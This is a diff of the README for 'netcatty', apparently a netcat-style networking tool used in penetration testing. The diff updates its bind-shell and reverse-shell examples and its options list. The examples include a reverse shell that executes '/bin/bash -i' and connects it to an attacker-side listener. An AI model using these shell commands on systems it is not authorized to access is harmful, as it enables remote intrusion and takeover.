@@ -71,15 +71,15 @@ If you're short on ideas for payloads, check the following:
 
 ### Bind shell
 
-Target machine (with IP 192.168.1.1): `nc -e "/bin/bash -i" -lp 4444`
+Target machine (with IP 192.168.1.1): `netcatty -e "/bin/bash -i" -lp 4444`
 
-Your terminal: `./netcatty -a 192.168.1.1:4444`
+Your terminal: `netcatty 192.168.1.1 4444`
 
 ### Reverse shell
 
-Target machine: `nc -e "/bin/bash -i" 192.168.1.100 4444`
+Target machine: `netcatty -e "/bin/bash -i" 192.168.1.100 4444`
 
-Your terminal (with IP 192.168.1.100): `./netcatty -l :4444`
+Your terminal (with IP 192.168.1.100): `netcatty -lp 4444`
 
 ## Installation
 
@@ -103,17 +103,40 @@ gox -output "dist/{{.Dir}}_{{.OS}}_{{.Arch}}"
 ## Usage
 
 ```
-Usage of ./netcatty:
-  -a string
-    	Listen/Connect address in the form of 'ip:port'.
-    	Domains, IPv6 as ip and Service as port ('localhost:http') also work. (default ":4444")
-  -l	Enable listening mode
-  -m	Disable automatic shell detection and TTY spawn on remote
-  -n string
-    	Network type to use. Known networks are:
-    	To connect: tcp, tcp4 (IPv4-only), tcp6 (IPv6-only), unix and unixpacket
-    	To listen: tcp, tcp4, tcp6, unix or unixpacket
-    	 (default "tcp")
+Usage:
+  netcatty [OPTIONS] [hostname] [port]
+
+Application Options:
+  -l, --listen      Listen mode, for inbound connects
+  -p, --local-port= Local port number
+  -r, --randomize   Randomize local and remote ports
+  -s, --source=     Local source address (ip or hostname)
+  -T, --telnet      answer using TELNET negotiation
+  -v, --verbose     -- Not effective, backwards compatibility
+  -V, --version     Output version information and exit
+
+Service:
+  -P, --protocol=   Provide protocol in the form of
+                    tcp{,4,6}|udp{,4,6}|unix{,gram,packet}|ip{,4,6}[:<protocol-number>|:<protocol-name>]
+                    For <protocol-number> check
+                    https://www.iana.org/assignments/protocol-numbers/protocol-numbers.xhtml
+  -t, --tcp         TCP mode (default)
+  -u, --udp         UDP mode
+
+InOut:
+  -e, --exec=       Program to exec after connect
+  -i, --interval=   Delay interval for data sent, ports scanned
+  -L, --tunnel=     Forward local port to remote address
+  -o, --output=     Output hexdump traffic to FILE (implies -x)
+  -x, --hexdump     Hexdump incoming and outgoing traffic
+  -z, --zero        Zero-I/O mode (used for scanning)
+
+Action:
+  -D, --detect      Detect remote shell automatically and try to raise a TTY on the remote
+  -R, --auto-raw    Put local TTY in Raw mode on connect (action)
+
+Help Options:
+  -h, --help        Show this help message
 ```
 
 ---
